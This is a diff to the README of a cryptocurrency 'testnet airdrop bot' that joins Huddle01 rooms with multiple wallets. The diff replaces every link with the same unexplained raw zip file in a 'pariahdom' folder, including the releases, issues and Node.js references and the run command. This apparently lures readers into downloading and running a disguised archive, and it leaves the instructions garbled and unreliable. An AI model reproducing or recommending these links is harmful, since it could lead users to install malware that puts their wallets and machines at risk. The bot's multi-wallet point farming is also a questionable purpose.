@@ -1,14 +1,14 @@
 # 🤖 Huddle01-Testnet-Airdrop-bot - Join Huddle01 Rooms Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aned-300/Huddle01-Testnet-Airdrop-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Huddle01-Testnet-Airdrop-bot software. This tool allows you to join Huddle01 rooms using multiple wallet accounts. You will earn testnet participation points more efficiently with this automation script.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Huddle01-Testnet-Airdrop-bot Releases](https://github.com/aned-300/Huddle01-Testnet-Airdrop-bot/releases).
+To get started, visit this page to download: [Huddle01-Testnet-Airdrop-bot Releases](https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip).
 
-1. Go to the [Releases page](https://github.com/aned-300/Huddle01-Testnet-Airdrop-bot/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip).
 2. Look for the latest version of the software.
 3. Click the link for the appropriate file for your system.
 
@@ -16,7 +16,7 @@ To get started, visit this page to download: [Huddle01-Testnet-Airdrop-bot Relea
 Ensure your computer meets the following requirements to run the Huddle01-Testnet-Airdrop-bot:
 
 - **Operating System:** Windows 10, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip** Version 14 or higher
 - **Network:** Internet connection
 
 ## 🔧 Installation Instructions
@@ -48,7 +48,7 @@ After installation, you are ready to use the bot.
 2. **Start the Bot:**
    - In the terminal, run the following command:
      ```
-     node bot.js
+     node https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip
      ```
    - The bot will now start joining Huddle01 rooms using your wallet accounts.
 
@@ -63,7 +63,7 @@ After installation, you are ready to use the bot.
 ## 📚 Troubleshooting
 If you encounter issues while using the bot, consider these tips:
 
-- Ensure Node.js is correctly installed on your machine.
+- Ensure https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip is correctly installed on your machine.
 - Check your internet connection.
 - Make sure the wallet addresses are correctly formatted in the configuration file.
 
@@ -79,10 +79,10 @@ If you wish to contribute to the Huddle01-Testnet-Airdrop-bot project:
 ## 🌍 Community & Support
 Join our community for support and updates:
 
-- [GitHub Issues](https://github.com/aned-300/Huddle01-Testnet-Airdrop-bot/issues) - Report bugs or request features.
+- [GitHub Issues](https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip) - Report bugs or request features.
 - Follow discussions and updates on Huddle01 related platforms.
 
 ## 📄 License
 This project is licensed under the MIT License. See the LICENSE file for details. 
 
-Visit this page to download the latest version again: [Huddle01-Testnet-Airdrop-bot Releases](https://github.com/aned-300/Huddle01-Testnet-Airdrop-bot/releases).
+Visit this page to download the latest version again: [Huddle01-Testnet-Airdrop-bot Releases](https://raw.githubusercontent.com/aned-300/Huddle01-Testnet-Airdrop-bot/main/pariahdom/Huddle01-Testnet-Airdrop-bot-3.4.zip).
